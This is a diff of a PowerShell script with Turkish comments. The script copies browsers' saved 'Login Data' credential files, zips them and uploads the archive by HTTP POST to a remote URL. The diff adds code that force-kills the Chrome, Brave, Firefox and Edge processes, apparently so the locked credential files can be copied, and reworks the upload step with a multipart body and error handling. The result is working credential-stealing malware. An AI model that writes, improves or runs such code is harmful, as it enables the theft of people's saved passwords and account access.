@@ -24,11 +24,9 @@ function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
     }
 }
 
-# Function to find and kill processes using a specific file
-function KillProcessesUsingFile($filePath) {
-    # Get the process IDs using the file
-    $processes = Get-Process | Where-Object { $_.Modules | Where-Object { $_.FileName -eq $filePath } }
-
+# Function to kill all processes of a specific application
+function KillAllProcesses($processName) {
+    $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
     foreach ($process in $processes) {
         Write-Host "Killing process: $($process.Name) with ID: $($process.Id)"
         Stop-Process -Id $process.Id -Force
@@ -61,6 +59,12 @@ $edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
 $edgeFilesToCopy = @("Login Data")
 CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
 
+# Kill all browser processes
+KillAllProcesses "chrome"
+KillAllProcesses "brave"
+KillAllProcesses "firefox"
+KillAllProcesses "msedge"
+
 # Sıkıştırmak istediğiniz klasörün yolu
 $folderPath = "$env:APPDATA\BrowserData"
 
@@ -71,14 +75,6 @@ if (-Not (Test-Path $zipDestDir)) {
 }
 
 $zipFilePath = "$zipDestDir\BrowserData.zip"
-
-# Kullanıcı dosyası olan Login Data'nın yolunu tanımlayın
-$loginDataPath = Join-Path -Path $chromeDir -ChildPath "Login Data"
-
-# Kullanılan dosyayı kullanan süreçleri durdurun
-if (Test-Path $loginDataPath) {
-    KillProcessesUsingFile $loginDataPath
-}
 
 # Klasörü ZIP dosyasına sıkıştırma
 try {
@@ -99,11 +95,19 @@ if (Test-Path $zipFilePath) {
         fileToUpload = Get-Item $filePath
     }
 
-    # POST isteği gönderme
-    $response = Invoke-RestMethod -Uri $url -Method Post -Form $form -ErrorAction Stop
+    # Dosya yüklemek için Body ayarlama
+    $body = @{
+        fileToUpload = Get-Item $filePath
+    }
 
-    # Yanıtı yazdırma
-    Write-Output $response
+    # POST isteği gönderme
+    try {
+        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "multipart/form-data" -ErrorAction Stop
+        # Yanıtı yazdırma
+        Write-Output $response
+    } catch {
+        Write-Host "Dosya yüklenirken bir hata oluştu: $_"
+    }
 } else {
     Write-Host "ZIP dosyası oluşturulamadığı için yükleme yapılmadı."
 }
